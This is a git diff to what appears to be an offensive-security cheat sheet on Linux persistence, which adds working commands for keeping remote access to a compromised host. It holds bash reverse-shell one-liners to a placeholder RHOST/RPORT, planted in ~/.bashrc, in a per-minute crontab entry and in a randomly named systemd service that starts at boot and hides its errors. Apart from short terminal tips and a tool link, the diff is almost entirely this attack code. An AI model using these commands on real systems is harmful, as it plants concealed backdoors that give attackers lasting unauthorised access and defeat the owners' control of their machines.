@@ -1,8 +1,43 @@
 # linux persistance
+
 anytime you have a remote shell, remember to background it and run *stty raw -echo* so the terminal will not echo special character and pass them through the shell (when you type *fg*, it will not echo to screen). You can also use *stty -a* on the attack machine to see your rows and columns and set them to the same thing on the remote box with *stty rows* and *stty cols* respectively
 
 ## tools
+
 [linper](https://github.com/montysecurity/linper)
+
+## bashrc
+
+- executed everytime bash is initialized for the given user
+
+`echo "bash -c 'bash -i > /dev/tcp/RHOST/RPORT 2>&1 0>&1' 2> /dev/null 1>&2 & sleep .0001" >> ~/.bashrc`
+
+## crontab
+
+`crontab -l > /tmp/tmp.cgL8qKGk4U && echo "* * * * * bash -c 'bash -i > /dev/tcp/RHOST/RPORT 2>&1 0>&1'" >> /tmp/tmp.cgL8qKGk4U; crontab /tmp/tmp.cgL8qKGk4U && rm /tmp/tmp.cgL8qKGk4U`
+
+## systemctl
+
+```
+echo "bash -c 'bash -i > /dev/tcp/RHOST/RPORT 2>&1 0>&1'" >> /etc/systemd/system/Tb8lKOKxGP.sh
+
+if test -f /etc/systemd/system/M8JmWQM9fr.service;
+then
+	echo > /dev/null
+else
+	touch /etc/systemd/system/M8JmWQM9fr.service
+	echo "[Service]" >> /etc/systemd/system/M8JmWQM9fr.service
+	echo "Type=oneshot" >> /etc/systemd/system/M8JmWQM9fr.service
+	echo "ExecStartPre=/usr/bin/sleep 60" >> /etc/systemd/system/M8JmWQM9fr.service
+	echo "ExecStart=/bin/bash /etc/systemd/system/Tb8lKOKxGP.sh" >> /etc/systemd/system/M8JmWQM9fr.service
+	echo "ExecStartPost=/usr/bin/sleep infinity" >> /etc/systemd/system/M8JmWQM9fr.service
+	echo "[Install]" >> /etc/systemd/system/M8JmWQM9fr.service
+	echo "WantedBy=multi-user.target" >> /etc/systemd/system/M8JmWQM9fr.service
+	chmod 644 /etc/systemd/system/M8JmWQM9fr.service
+	systemctl start M8JmWQM9fr.service 2> /dev/null & sleep .0001
+	systemctl enable M8JmWQM9fr.service 2> /dev/null & sleep .0001
+fi
+```
 
 ## directories
 everything in /etc/init and /etc/init.d/ is ran at startup
